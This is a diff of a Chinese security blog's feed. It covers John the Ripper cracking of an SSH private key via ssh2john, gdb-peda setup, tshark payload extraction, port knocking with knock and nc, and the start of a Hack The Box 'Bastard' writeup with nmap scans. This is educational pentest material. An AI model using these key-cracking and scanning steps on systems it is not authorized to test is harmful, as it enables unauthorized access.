@@ -52,31 +52,31 @@
 &lt;h2 id="linux-提权枚举"&gt;Linux 提权枚举&lt;/h2&gt;
 &lt;h3 id="终端升级与提高稳定性"&gt;终端升级与提高稳定性&lt;/h3&gt;
 &lt;p&gt;在 Linux 目标获得立足点时，首先应该尝试的是将 shell 升级为完整的 TTY（交互式 shell）。&lt;/p&gt;</description></item><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ ssh2john id_rsa | tee key_hash
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SSH 私钥文件本身采用专门的格式储存，其中包含了加密的参数消息、加密算法以及密文数据，而不是直接的密码哈希字符串，私钥加密时会采用密钥派生函数（如 PBKDF2 或 bcrypt ）来对口令生成对称密钥，然后用该密钥对私钥数据进行加密，使得文件内容看起来像是一段难以辨别的编码数据。John 是一个专门用于破解密码哈希的工具，他需要知道加密算法的具体参数（例如加密方式、迭代次数、盐值等），才能通过暴力破解或者字典攻击验证猜测的口令是否正确。ssh2john 就是用来解析 SSH 私钥文件，提取出其中的加密参数和密文数据，构造出一个标准化的哈希格式，这种格式正式 John 能够识别并处理的。只有经过这种转换，John 才能根据已知的加密参数对猜测的口令进行验证，否则直接对原始密钥文件进行暴力破解是不现实的，因为文件格式本身并不直接暴露口令的哈希。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ ssh2john id_rsa | tee key_hash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;SSH 私钥文件本身采用专门的格式储存，其中包含了加密的参数消息、加密算法以及密文数据，而不是直接的密码哈希字符串，私钥加密时会采用密钥派生函数（如 PBKDF2 或 bcrypt ）来对口令生成对称密钥，然后用该密钥对私钥数据进行加密，使得文件内容看起来像是一段难以辨别的编码数据。John 是一个专门用于破解密码哈希的工具，他需要知道加密算法的具体参数（例如加密方式、迭代次数、盐值等），才能通过暴力破解或者字典攻击验证猜测的口令是否正确。ssh2john 就是用来解析 SSH 私钥文件，提取出其中的加密参数和密文数据，构造出一个标准化的哈希格式，这种格式正式 John 能够识别并处理的。只有经过这种转换，John 才能根据已知的加密参数对猜测的口令进行验证，否则直接对原始密钥文件进行暴力破解是不现实的，因为文件格式本身并不直接暴露口令的哈希。&lt;/p&gt;
 &lt;p&gt;John 设计的初衷在于专注于高效破解，而不是兼顾解析和转换各种格式文件。各种密钥文件和加密数据都有自己独特的储存格式、加密参数和版本演变，内置所有解析逻辑会使得核心代码变得臃肿，增加维护难度和安全风险，同时也会分散团队在算法优化和并行处理上的精力。事实上，文件格式转换本身是一项非常复杂且不断演进的工作，许多转换工具最初由社区不同专家针对各自领域开发出来，这种分工使得每个工具都可以专注于特定格式的深度解析和不断更新，而 John 的核心开发者可以集中精力提升密码破解的速度和准确性。再者，不同格式的解析逻辑通常需要对各种加密协议和密钥派生函数有精确而细致的处理，若将这些所有细节内知道主程序中，不仅会增加软件整体的复杂度，还会使得未来支持新格式的工作变得更为繁琐和风险巨大。通过采用独立的 ssh2john 攻击，整个破解流程得以模块化：用户首先通过专门的转换工具提取破解所需的关键信息，再交由 John 进行针对性暴力破解或字典攻击，这样的架构既提高了灵活性，也确保了每个环节都能在各自领域达到最佳效果。&lt;/p&gt;
 &lt;h2 id="john-破解提取的私钥"&gt;John 破解提取的私钥&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ john key_hash
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;John the Ripper 默认会按照一套预设的攻击策略以此尝试不同的破解模式。当不指定特定模式时，John 首先启动单一模式（Single crack mode），利用哈希文件中的信息（例如用户名、文件名等）生成候选密码并进行尝试；这就是输出模式中显示 “Proceeding with single,rule:Single” 所表达的含义。单一模式通常能在很短的时间内尝试一些最可能的密码组合，当 John 发现还有缓冲的候选密码没有处理完时，它会尽快完成这部分工作。接下来，John 会自动进入下一阶段，也就是使用默认字典进行攻击。如果前面两种都没有破解成功，John 就会启动最全面但是效率较低的增量模式（Incrementak mode），即基于 ASCII 字符的穷举攻击。整个流程的设计逻辑在于先用最后可能的密码组合进行快速尝试，再逐步扩大候选密码空间，再有限的时间内尽可能高效地覆盖大部分实际使用的密码组合。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ john key_hash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;John the Ripper 默认会按照一套预设的攻击策略以此尝试不同的破解模式。当不指定特定模式时，John 首先启动单一模式（Single crack mode），利用哈希文件中的信息（例如用户名、文件名等）生成候选密码并进行尝试；这就是输出模式中显示 “Proceeding with single,rule:Single” 所表达的含义。单一模式通常能在很短的时间内尝试一些最可能的密码组合，当 John 发现还有缓冲的候选密码没有处理完时，它会尽快完成这部分工作。接下来，John 会自动进入下一阶段，也就是使用默认字典进行攻击。如果前面两种都没有破解成功，John 就会启动最全面但是效率较低的增量模式（Incrementak mode），即基于 ASCII 字符的穷举攻击。整个流程的设计逻辑在于先用最后可能的密码组合进行快速尝试，再逐步扩大候选密码空间，再有限的时间内尽可能高效地覆盖大部分实际使用的密码组合。&lt;/p&gt;
 &lt;h3 id="fasttrack-字典"&gt;fasttrack 字典&lt;/h3&gt;
 &lt;p&gt;fasttrack.txt 时 Kali 中的一个轻量级 “常用弱口令字典” ，其优势在于体量小、命中率较高，开箱即用，但不会随着 Kali 的更新而更新。作为测试时的第一步爆破字典，它可以帮助安全人员快速验证目标是否使用了过于单一或过时的弱密码。对于需要兼顾速度与小笼包的渗透测试场景而言，先从 fasttrack.txt 入手，再逐步过渡到规模更大的字典列表是一种较为常见且易于实施的做法。&lt;/p&gt;</description></item><item><title>使用GDB分析缓存区溢出漏洞</title><link>https://enilmalus.github.io/posts/%E4%BD%BF%E7%94%A8gdb%E5%88%86%E6%9E%90%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</link><pubDate>Wed, 31 Dec 2025 08:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E4%BD%BF%E7%94%A8gdb%E5%88%86%E6%9E%90%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</guid><description>&lt;h2 id="gdb-peda-分析"&gt;gdb-peda 分析&lt;/h2&gt;
 &lt;p&gt;peda 是 Python Exploit Development Assistance 的缩写，这个工具是建立在 GDB 之上的，用 Python 编写的，旨在位利用开发提供版主。其设计初衷是为了让漏洞分析和利用开发过程更加直观高效，通过增强 GDB 的功能，如改进的堆栈、寄存器和内存显示，以及针对二进制分析和漏洞挖掘的实用工具，帮助安全研究人员更快地理解和利用程序中的漏洞。犹豫利用开发往往需要细致地分析程序执行状态、内存布局反编译代码，gdb-peda 的这些增强功能就显得尤为重要，能大大提升调试和漏洞利用的效率。&lt;/p&gt;
 &lt;h3 id="gdb-peda-下载"&gt;gdb-peda 下载&lt;/h3&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ sudo apt install gdb-peda
-gdb-peda is already the newest version (1.2-0kali2).
-The following packages were automatically installed and are no longer required:
- gcc-14-base:i386 libblkid-dev libgio-2.0-dev-bin libicu-dev libpython3.12-minimal libsepol-dev native-architecture python3-poetry-dynamic-versioning python3.12-tk
- gir1.2-girepository-2.0 libflac12t64 libgirepository-1.0-1 liblbfgsb0 libpython3.12-stdlib libsysprof-capture-4-dev python3-aioconsole python3-pywerview ruby-zeitwerk
- girepository-tools libfuse3-3 libglapi-mesa libplacebo349 libpython3.12t64 libutempter0 python3-dunamai python3-setproctitle strongswan
- icu-devtools libgeos3.13.0 libglib2.0-dev-bin libpoppler145 librav1e0.7 libx264-164 python3-nfsclient python3-tomlkit
-Use &amp;#39;sudo apt autoremove&amp;#39; to remove them.
-
-Summary:
- Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 1420
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="启动分析"&gt;启动分析&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ sudo apt install gdb-peda
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;gdb-peda is already the newest version &lt;span style="color:#f92672"&gt;(&lt;/span&gt;1.2-0kali2&lt;span style="color:#f92672"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;The following packages were automatically installed and are no longer required:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; gcc-14-base:i386 libblkid-dev libgio-2.0-dev-bin libicu-dev libpython3.12-minimal libsepol-dev native-architecture python3-poetry-dynamic-versioning python3.12-tk
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; gir1.2-girepository-2.0 libflac12t64 libgirepository-1.0-1 liblbfgsb0 libpython3.12-stdlib libsysprof-capture-4-dev python3-aioconsole python3-pywerview ruby-zeitwerk
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; girepository-tools libfuse3-3 libglapi-mesa libplacebo349 libpython3.12t64 libutempter0 python3-dunamai python3-setproctitle strongswan
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; icu-devtools libgeos3.13.0 libglib2.0-dev-bin libpoppler145 librav1e0.7 libx264-164 python3-nfsclient python3-tomlkit
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Use &lt;span style="color:#e6db74"&gt;&amp;#39;sudo apt autoremove&amp;#39;&lt;/span&gt; to remove them.
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Summary:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: &lt;span style="color:#ae81ff"&gt;1420&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="启动分析"&gt;启动分析&lt;/h3&gt;
 &lt;p&gt;寻找 peda 存放位置&lt;/p&gt;</description></item><item><title>流量包分析，以 tshark、tcpdump、wireshark 为例</title><link>https://enilmalus.github.io/posts/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E4%BB%A5-tsharktcpdumpwireshark-%E4%B8%BA%E4%BE%8B/</link><pubDate>Tue, 30 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E4%BB%A5-tsharktcpdumpwireshark-%E4%B8%BA%E4%BE%8B/</guid><description>&lt;h2 id="流量包分析"&gt;流量包分析&lt;/h2&gt;
 &lt;h3 id="libpcappacket-pactrue-library"&gt;Libpcap（Packet Pactrue Library）&lt;/h3&gt;
 &lt;p&gt;Libpcap 是 Unix/Linux 下的标准数据包捕获库，tshark、tcpdump、wireshark 都是通过获取这个接口实现抓包功能。&lt;/p&gt;
@@ -100,78 +100,78 @@ Summary:
 &lt;p&gt;&lt;code&gt;-f 'host 10.10.10.45'&lt;/code&gt; 的语法在 tshark、tcpdump、wireshark 等流量分析工具中是通用的，即 BPF 语法。它是一种在内核层面进行的数据包过滤机制，它允许网络抓包工具在数据包传输到用户空间之前就进行筛选，从而大大提高了捕获效率，BPF 提供了一套虚拟指令集，用户可以编写规则，内核在接收到每个数据包时按照这些规则进行判断，只有符合条件的数据包才会被传输到用户空间进行进一步处理，由于在内核中进行过滤能够避免将大量不必要的数据包拷贝到用户空间，这种设计不仅优化了性能，还降低了系统资源的消耗，使得 BPF 成为了许多网络分析、监控和安全审计工具的核心组件。&lt;/p&gt;
 &lt;p&gt;&lt;img src="P1.png" alt="P1"&gt;&lt;/p&gt;
 &lt;p&gt;例如上面这个执行结果，10.10.10.145 这台主机以 UDP 协议向广播地址 255.255.255.255 发送数据包，流量呈现出明显的周期性和两种不同特征，数据包大概每隔 60 秒成对出现，一类数据包显示 UDP，字段为 139，负载较小，一类数据包显示 UDP，字段为 514，负载较大。周期内数据包发送顺序可能互换，表明了主机很可能在进行某种广播式的服务或心跳检测，利用 UDP 的无连接特性通过广播方式向网络中其他设备通告状态信息或探测服务。整个流量特征体现了主动广播、定时发送以及数据包大小与内容明显区分的规律性，这在网络设备中并不罕见，有必要进一步看具体的数据意义。&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;tsahrk -i eth0 -f &amp;#39;host 10.10.10.45&amp;#39; -w Enilmalus.pcap
-
-tsahrk -r Enilmalus.pcap -V
-
-tshark -r Enilmalus.pcap -T fields -e data | tr -d &amp;#39; &amp;#39; | xxd -r -p
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解释一下最底下这个命令，这是一个完整的网络数据分析流程，从抓包文件 Enilmalus.pcap 中提取原始数据并将其转换为人类可读的文件。命令从 tshark 开始，它是 wireshark 的命令行版本，用于处理网络流量，前面捕捉流量，现在读取，-r 时 read 的缩写，指示 tshark 从 Enilmalus.pcap 中读取数据：-T 是 type 的缩写，指定输出类型为 fields（字段），表示以字段形式输出而不是完整的数据包详情；-e 是 extract 的缩写，后面接 data，告诉 tshark 提取每个数据包的原始负载，通常以十六进制字符串形式输出，例如 &lt;code&gt;48 65 6c 6c 6f&lt;/code&gt;。接着，管道符号 &lt;code&gt;|&lt;/code&gt; 将输出传递给 tr ，这是一个 translate 的工具；-d 是 delete 的缩写，后面跟 &lt;code&gt;' '&lt;/code&gt; ，表示一处所有空格，表示移除所有空格，把带空格的 &lt;code&gt;48 65 6c 6c 6f&lt;/code&gt; 变成 &lt;code&gt;48656c6c6f&lt;/code&gt;。最后，另一个管道 &lt;code&gt;|&lt;/code&gt; 将结果交给 xxd。一个处理十六进制字符串的工具，其名称为 &lt;code&gt;hexadecimal&lt;/code&gt; 和 &lt;code&gt;dump&lt;/code&gt; 的组合，用于创建或解析数据的十六进制转储；-r 是 reverse 的缩写，表示将十六进制字符串转换为二进制；-p 是 plaintext 的缩写，处理没有分隔符的连续十六进制字符串，最终 &lt;code&gt;48656c6c6f&lt;/code&gt; 解读为可读的 &lt;code&gt;Hello&lt;/code&gt;。&lt;/p&gt;</description></item><item><title>端口敲门与单包授权与零开端口</title><link>https://enilmalus.github.io/posts/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8%E5%8D%95%E5%8C%85%E6%8E%88%E6%9D%83%E4%B8%8E%E9%9B%B6%E5%BC%80%E7%AB%AF%E5%8F%A3/</link><pubDate>Tue, 30 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8%E5%8D%95%E5%8C%85%E6%8E%88%E6%9D%83%E4%B8%8E%E9%9B%B6%E5%BC%80%E7%AB%AF%E5%8F%A3/</guid><description>&lt;h2 id="端口敲门"&gt;端口敲门&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tsahrk -i eth0 -f &lt;span style="color:#e6db74"&gt;&amp;#39;host 10.10.10.45&amp;#39;&lt;/span&gt; -w Enilmalus.pcap
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tsahrk -r Enilmalus.pcap -V
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tshark -r Enilmalus.pcap -T fields -e data | tr -d &lt;span style="color:#e6db74"&gt;&amp;#39; &amp;#39;&lt;/span&gt; | xxd -r -p
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解释一下最底下这个命令，这是一个完整的网络数据分析流程，从抓包文件 Enilmalus.pcap 中提取原始数据并将其转换为人类可读的文件。命令从 tshark 开始，它是 wireshark 的命令行版本，用于处理网络流量，前面捕捉流量，现在读取，-r 时 read 的缩写，指示 tshark 从 Enilmalus.pcap 中读取数据：-T 是 type 的缩写，指定输出类型为 fields（字段），表示以字段形式输出而不是完整的数据包详情；-e 是 extract 的缩写，后面接 data，告诉 tshark 提取每个数据包的原始负载，通常以十六进制字符串形式输出，例如 &lt;code&gt;48 65 6c 6c 6f&lt;/code&gt;。接着，管道符号 &lt;code&gt;|&lt;/code&gt; 将输出传递给 tr ，这是一个 translate 的工具；-d 是 delete 的缩写，后面跟 &lt;code&gt;' '&lt;/code&gt; ，表示一处所有空格，表示移除所有空格，把带空格的 &lt;code&gt;48 65 6c 6c 6f&lt;/code&gt; 变成 &lt;code&gt;48656c6c6f&lt;/code&gt;。最后，另一个管道 &lt;code&gt;|&lt;/code&gt; 将结果交给 xxd。一个处理十六进制字符串的工具，其名称为 &lt;code&gt;hexadecimal&lt;/code&gt; 和 &lt;code&gt;dump&lt;/code&gt; 的组合，用于创建或解析数据的十六进制转储；-r 是 reverse 的缩写，表示将十六进制字符串转换为二进制；-p 是 plaintext 的缩写，处理没有分隔符的连续十六进制字符串，最终 &lt;code&gt;48656c6c6f&lt;/code&gt; 解读为可读的 &lt;code&gt;Hello&lt;/code&gt;。&lt;/p&gt;</description></item><item><title>端口敲门与单包授权与零开端口</title><link>https://enilmalus.github.io/posts/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8%E5%8D%95%E5%8C%85%E6%8E%88%E6%9D%83%E4%B8%8E%E9%9B%B6%E5%BC%80%E7%AB%AF%E5%8F%A3/</link><pubDate>Tue, 30 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8%E5%8D%95%E5%8C%85%E6%8E%88%E6%9D%83%E4%B8%8E%E9%9B%B6%E5%BC%80%E7%AB%AF%E5%8F%A3/</guid><description>&lt;h2 id="端口敲门"&gt;端口敲门&lt;/h2&gt;
 &lt;p&gt;端口敲门（port knocking）技术是一种基于隐蔽认证的安全机制，允许在默认关闭所有入站端口的情况下，仅通过特定顺序的端口访问来动态开放特定服务。其核心思想是服务器在初始状态下屏蔽所有连接，只有当客户端按预设顺序向多个端口发送数据包时，服务器才能识别合法模式并临时修改防火墙规则，允许特定 IP 访问受保护的端口，比如 SSH、RDP、Web 服务等。这种方式可以隐藏关键端口，防止端口扫描工具探测到开放的服务，从而降低被攻击的风险。&lt;/p&gt;
 &lt;p&gt;实现端口敲门通常依赖 knockd 这类监听工具，它监测入站数据包，识别预定义的敲门序列，并在匹配成功后执行相应的防火墙命令。例如，可以配置规则服务器在接收到 &lt;code&gt;7000-&amp;gt;8000-&amp;gt;9000&lt;/code&gt; 端口顺序连接后，动态放行 SSH 端口，同时可以设定 &lt;code&gt;9000-&amp;gt;8000-&amp;gt;7000&lt;/code&gt; 作为关闭 SSH 端口的敲门序列。客户端只需要发送正确的敲门请求，就能临时开启远程管理端口，使用 SSH 连接服务器，操作完成后再敲门恢复防火墙规则，确保端口重新关闭。&lt;/p&gt;
 &lt;p&gt;这种方式的优点在于可以有效减少攻击面，避免端口扫描暴露服务，适合用于保护 SSH 等关键管理端口，同时不需要额外的 VPN 或复杂的加密认证方案，资源占用极低。然而，端口敲门也有明显的局限性，比如攻击者能监听流量，就可能获取端口序列并复现攻击。此外，每次访问都需要先发送敲门序列，增加运维成本。为了解决这个问题，可以使用更安全的 &lt;code&gt;单包授权（SPA）&lt;/code&gt; 机制，例如 fwknop 这类工具，它通过 GnuPG 加密的单一 UDP 数据包进行认证，避免传统敲门方式可能被监听和重放的风险。&lt;/p&gt;
 &lt;p&gt;在实际应用中，端口敲门适用于 SSH 服务器的控制访问、隐藏数据库和管理面板等关键服务、以及提供短期远程管理权限，特别是在企业安全策略中，可作为 &lt;code&gt;零开端口（Zero Open Port）&lt;/code&gt; 方案的一部分，有效减少暴露面，提高服务器安全性。&lt;/p&gt;
 &lt;p&gt;下面是端口敲门的命令演示：&lt;/p&gt;
 &lt;p&gt;knock 敲门演示：&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ knock -v 10.10.10.45 197 719 801 983
-hitting tcp 10.10.10.45:197
-hitting tcp 10.10.10.45:719
-hitting tcp 10.10.10.45:801
-hitting tcp 10.10.10.45:983
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nc 敲门演示：&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ for port in 197 719 801 983 ; do nc -zv 10.10.10.45 $port;sleep 1; done
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解释一下这个 nc 命令，先循环这四个端口，依次赋值给 $port ，接着 nc 使用 -z 零模式，只尝试连接，不发送任何数据，连接成功说明端口开放，-v 详细输出，显示连接结果，暂停 1 秒接着执行。&lt;/p&gt;</description></item><item><title>Bastard Writeup</title><link>https://enilmalus.github.io/posts/bastard-writeup/</link><pubDate>Sun, 28 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/bastard-writeup/</guid><description>&lt;blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ knock -v 10.10.10.45 &lt;span style="color:#ae81ff"&gt;197&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;719&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;801&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;983&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;hitting tcp 10.10.10.45:197
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;hitting tcp 10.10.10.45:719
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;hitting tcp 10.10.10.45:801
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;hitting tcp 10.10.10.45:983
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;nc 敲门演示：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; port in &lt;span style="color:#ae81ff"&gt;197&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;719&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;801&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;983&lt;/span&gt; ; &lt;span style="color:#66d9ef"&gt;do&lt;/span&gt; nc -zv 10.10.10.45 $port;sleep 1; &lt;span style="color:#66d9ef"&gt;done&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解释一下这个 nc 命令，先循环这四个端口，依次赋值给 $port ，接着 nc 使用 -z 零模式，只尝试连接，不发送任何数据，连接成功说明端口开放，-v 详细输出，显示连接结果，暂停 1 秒接着执行。&lt;/p&gt;</description></item><item><title>Bastard Writeup</title><link>https://enilmalus.github.io/posts/bastard-writeup/</link><pubDate>Sun, 28 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/bastard-writeup/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;本文章以 kali 地址为 10.10.16.46 做演示&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2 id="初始侦察"&gt;初始侦察&lt;/h2&gt;
 &lt;h3 id="nmap-端口扫描"&gt;nmap 端口扫描&lt;/h3&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ sudo nmap --min-rate 10000 -p- 10.129.6.171 -oA nmap/ports
-[sudo] password for kali: 
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 08:11 EST
-Nmap scan report for 10.129.6.171
-Host is up (0.39s latency).
-Not shown: 65532 filtered tcp ports (no-response)
-PORT STATE SERVICE
-80/tcp open http
-135/tcp open msrpc
-49154/tcp open unknown
-
-Nmap done: 1 IP address (1 host up) scanned in 15.57 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="nmap-详细信息扫描"&gt;nmap 详细信息扫描&lt;/h3&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ sudo nmap -sT -sC -sV -O -p80,135,49154 10.129.6.171 -oA nmap/detail 
-[sudo] password for kali: 
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 08:12 EST
-Nmap scan report for 10.129.6.171
-Host is up (0.22s latency).
-
-PORT STATE SERVICE VERSION
-80/tcp open http Microsoft IIS httpd 7.5
-|_http-server-header: Microsoft-IIS/7.5
-|_http-generator: Drupal 7 (http://drupal.org)
-| http-methods: 
-|_ Potentially risky methods: TRACE
-| http-robots.txt: 36 disallowed entries (15 shown)
-| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
-|_/LICENSE.txt /MAINTAINERS.txt
-|_http-title: Welcome to Bastard | Bastard
-135/tcp open msrpc Microsoft Windows RPC
-49154/tcp open msrpc Microsoft Windows RPC
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose|phone|specialized
-Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|2012|Phone|8.1 (97%)
